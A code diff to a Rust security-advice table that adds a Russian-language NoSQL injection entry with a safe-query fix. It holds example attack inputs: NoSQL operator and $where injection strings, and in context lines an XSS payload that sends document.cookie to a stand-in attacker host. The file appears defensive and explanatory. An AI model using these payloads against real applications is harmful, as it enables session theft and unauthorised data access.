@@ -1384,6 +1384,11 @@ fn flow_advice(category: &str) -> (Option<String>, Vec<String>, Option<String>) 
             &["Выполнение произвольного кода", "Полная компрометация приложения"],
             "data = json.loads(text)  # a safe parser instead of eval/exec/pickle",
         ),
+        "NoSQL-инъекция" => (
+            "Ввод «{\"$gt\": \"\"}» в фильтр или JS в $where («'; return true; //») обходит проверку и выдаёт чужие записи.",
+            &["Обход аутентификации и фильтров запроса", "Чтение чужих данных", "Выполнение JS на сервере БД ($where)"],
+            "db.users.find({ name: { $eq: String(req.query.name) } })  // fixed operator, coerced type; never $where with input",
+        ),
         "XSS" => (
             "Ввод «<script>fetch('//attacker/'+document.cookie)</script>» крадёт cookie в браузере жертвы.",
             &["Кража сессий и токенов", "Действия от имени пользователя", "Подмена содержимого страницы"],
